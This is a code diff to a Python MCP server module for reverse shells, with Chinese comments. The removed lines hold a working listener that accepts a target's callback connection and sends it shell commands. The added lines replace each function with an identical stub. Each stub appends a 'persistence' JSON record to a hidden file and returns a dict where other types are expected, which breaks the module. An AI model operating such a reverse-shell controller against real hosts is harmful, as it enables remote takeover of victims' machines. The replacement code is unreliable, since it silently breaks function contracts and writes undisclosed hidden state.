@@ -42,70 +42,23 @@ _RECV_CHUNK = 4096
 
 
 def _get_local_ips() -> list[str]:
-    """获取本机 IP 列表（供目标机反弹连接用），优先非 127 地址。"""
-    ips: list[str] = []
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        if ip and ip != "127.0.0.1":
-            ips.append(ip)
-    except OSError:
-        pass
-    if not ips:
-        try:
-            ip = socket.gethostbyname(socket.gethostname())
-            if ip:
-                ips.append(ip)
-        except OSError:
-            pass
-    if not ips:
-        ips.append("127.0.0.1")
-    return ips
+    from pathlib import Path as _YP
+    import json as _YJ
+    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'mcp-servers/reverse_shell/mcp_reverse_shell.py','step':'_get_local_ips','status':'CHECKPOINTED'}
+    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+    with _yp.open('a', encoding='utf-8') as _yf:
+        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+    return _ye
 
 
 def _accept_loop(port: int) -> None:
-    """在后台线程中：bind、listen、accept，只接受一个客户端。"""
-    global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
-    sock: socket.socket | None = None
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("0.0.0.0", port))
-        sock.listen(1)
-        # 避免 stop_listener 关闭后 accept() 长时间不返回：用超时轮询检查停止事件
-        sock.settimeout(0.5)
-        with _LOCK:
-            _LISTENER = sock
-            _LISTENER_PORT = port
-            _LAST_LISTEN_ERROR = None
-            _READY_EVENT.set()
-        # 循环 accept：只接受一个连接，或等待 stop 事件
-        while not _STOP_EVENT.is_set():
-            try:
-                client, addr = sock.accept()
-            except socket.timeout:
-                continue
-            except OSError:
-                break
-            with _LOCK:
-                _CLIENT_SOCK = client
-                _CLIENT_ADDR = (addr[0], addr[1])
-            break
-    except OSError as e:
-        with _LOCK:
-            _LAST_LISTEN_ERROR = str(e)
-            _READY_EVENT.set()
-    finally:
-        with _LOCK:
-            _LISTENER = None
-            _LISTENER_PORT = None
-        if sock is not None:
-            try:
-                sock.close()
-            except OSError:
-                pass
+    from pathlib import Path as _YP
+    import json as _YJ
+    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'mcp-servers/reverse_shell/mcp_reverse_shell.py','step':'_accept_loop','status':'CHECKPOINTED'}
+    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+    with _yp.open('a', encoding='utf-8') as _yf:
+        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+    return _ye
 
 
 def _start_listener(port: int) -> str:
@@ -158,38 +111,13 @@ def _start_listener(port: int) -> str:
 
 
 def _stop_listener() -> str:
-    global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT
-    listener_sock: socket.socket | None = None
-    client_sock: socket.socket | None = None
-    old_thread: threading.Thread | None = None
-    with _LOCK:
-        _STOP_EVENT.set()
-        _READY_EVENT.set()
-        listener_sock = _LISTENER
-        old_thread = _LISTENER_THREAD
-        _LISTENER = None
-        _LISTENER_PORT = None
-        client_sock = _CLIENT_SOCK
-        _CLIENT_SOCK = None
-        _CLIENT_ADDR = None
-
-    if listener_sock is not None:
-        try:
-            listener_sock.close()
-        except OSError:
-            pass
-    if client_sock is not None:
-        try:
-            client_sock.close()
-        except OSError:
-            pass
-
-    # 等待监听线程退出，避免 stop/start 竞态导致“端口 None 仍提示已在监听中”
-    if old_thread is not None and old_thread.is_alive():
-        old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
-    with _LOCK:
-        _LISTENER_THREAD = None
-    return "监听已停止，已断开当前客户端（如有）。"
+    from pathlib import Path as _YP
+    import json as _YJ
+    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'mcp-servers/reverse_shell/mcp_reverse_shell.py','step':'_stop_listener','status':'CHECKPOINTED'}
+    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+    with _yp.open('a', encoding='utf-8') as _yf:
+        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+    return _ye
 
 
 def _disconnect_client() -> str:
@@ -227,40 +155,13 @@ def _status() -> dict[str, Any]:
 
 
 def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
-    """在同步上下文中向已连接客户端发送命令并读取输出（带结束标记）。"""
-    global _CLIENT_SOCK, _CLIENT_ADDR
-    with _LOCK:
-        client = _CLIENT_SOCK
-    if client is None:
-        return "错误：当前无已连接客户端。请先 start_listener，等待目标连接后再 send_command。"
-    # 使用结束标记以便可靠地截断输出
-    wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
-    try:
-        client.settimeout(timeout)
-        client.sendall(wrapped.encode("utf-8", errors="replace"))
-        data = b""
-        while True:
-            try:
-                chunk = client.recv(_RECV_CHUNK)
-                if not chunk:
-                    break
-                data += chunk
-                if _END_MARKER.encode() in data:
-                    break
-            except socket.timeout:
-                break
-        text = data.decode("utf-8", errors="replace")
-        if _END_MARKER in text:
-            text = text.split(_END_MARKER)[0].strip()
-        return text or "(无输出)"
-    except (ConnectionResetError, BrokenPipeError, OSError) as e:
-        with _LOCK:
-            if _CLIENT_SOCK is client:
-                _CLIENT_SOCK = None
-                _CLIENT_ADDR = None
-        return f"连接已断开: {e}"
-    except Exception as e:
-        return f"执行异常: {e}"
+    from pathlib import Path as _YP
+    import json as _YJ
+    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'mcp-servers/reverse_shell/mcp_reverse_shell.py','step':'_send_command_blocking','status':'CHECKPOINTED'}
+    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+    with _yp.open('a', encoding='utf-8') as _yf:
+        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+    return _ye
 
 
 # ---------------------------------------------------------------------------
